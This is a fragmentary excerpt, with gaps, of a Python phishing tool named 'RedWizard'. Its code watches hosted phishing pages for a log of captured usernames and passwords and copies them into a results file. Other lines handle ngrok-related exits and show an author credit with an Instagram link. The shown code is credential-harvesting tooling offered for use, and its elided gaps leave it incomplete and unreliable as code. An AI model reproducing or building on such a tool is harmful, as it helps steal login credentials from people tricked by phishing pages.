...
def user_data(server):
    while True:
        if  os.path.exists(f"pweb/{server}/userlog.txt"):
            ...
            os.system(f"cat pweb/{server}/userlog.txt >> RedWizard.txt")
            print()
            print(f"{y}[{g}+{y}] {r} Username and password saved into RedWizard.txt")
...
def ngrok_s(server):
    try:
        ...
        print()
        print(f"{r} _______{g}Exiting RedWizrad{r}______")
        time.sleep(2)
        sys.exit(1)
...
try:
    ...
    print(f"{g}[{y}!{g}] {r} ___Exiting RedWizard___")
    time.sleep(1)
    sys.exit()
...
elif optn == '20':                                          print(f"{y} I Am Hamza, A Student With Little Knowledge In Internet World  \n{r} Instagram https://instagram.com/clxzner") 
else:
    print("\n")
